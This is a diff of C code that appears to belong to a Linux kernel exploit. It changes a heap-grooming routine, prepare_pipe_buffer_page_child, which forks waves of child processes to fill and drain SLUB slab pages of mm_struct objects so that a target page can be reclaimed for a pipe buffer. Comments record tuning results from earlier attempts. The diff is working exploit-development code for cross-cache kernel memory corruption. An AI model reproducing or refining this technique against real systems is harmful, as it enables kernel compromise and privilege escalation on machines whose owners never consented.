@@ -574,19 +574,18 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
       target_owned = 1;
       break;
     }
-    /* Exactly one slab's worth per wave (34), not 3*34+8=110.  Forensics
-     * (g14 killpoll): the 34 wave mms that land on the target page are
-     * PERMANENTLY leaked (inuse frozen 34 / freelist NULL for the whole
-     * 10s after a serial kill_child of 110) -- an mmgrab holder that
-     * never releases.  The divider between the never-leaking precedents
-     * (pre's clone_memfd: fork->kill within us, pre-sweep always reads
-     * inuse=0) and the always-leaking wave (~1s live time between the
-     * 110 forks and the kill) is how long the mm sits in pause() where
-     * a scanner can claim it.  Wave size objs_per_slab keeps a full
-     * slab turnover while cutting live time to ~55ms (34 forks ~25ms +
-     * serial kill ~30ms); the empty-slab burst for the min_partial
-     * flush now comes from 24 such small waves instead of 6 big ones. */
-    size_t wave_n = objs_per_slab;
+    /* Two slabs per wave (68): the first 34 fill the chain-head page
+     * (the target when this wave's cpu happens to own it -- forensics
+     * show the target page's owning cpu is lottery per attempt: the
+     * 110-wide waves caught it on cpu0 and leaked; the 34-wide waves
+     * never touched it), the second 34 deactivate that full page off
+     * the cpu slot so it lands on the NODE partial list where the
+     * empty-slab accumulation can actually discard it.  A single 34
+     * only cycles fill/empty on the same cpu slab forever (g20: 24
+     * waves of inuse=0, sc never 0 -- the page stayed a frozen cpu
+     * slab).  Live time ~110ms stays far under the ~1s window where
+     * the permanent mmgrab holder claims mms (g14). */
+    size_t wave_n = 2 * objs_per_slab;
     for (size_t i = 0; i < wave_n; i++) {
       wave_pids[w * wave_sz + i] = clone_child();
     }
